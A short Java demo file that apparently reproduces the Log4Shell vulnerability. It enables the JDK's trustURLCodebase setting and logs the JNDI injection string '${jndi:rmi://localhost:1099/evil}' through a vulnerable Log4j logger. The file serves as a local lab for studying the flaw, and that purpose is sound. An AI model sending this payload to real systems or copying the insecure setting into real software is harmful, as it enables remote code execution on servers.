package com.zjm.log.log4jbug;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 引入log4j的被攻击系统
 */
public class Log4jTest {
    private static final Logger logger= LogManager.getLogger();

    public static void main(String[] args) {
        // JDK开启远程调用
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        String input="${jndi:rmi://localhost:1099/evil}";
        logger.error("input,{}",input);
    }
}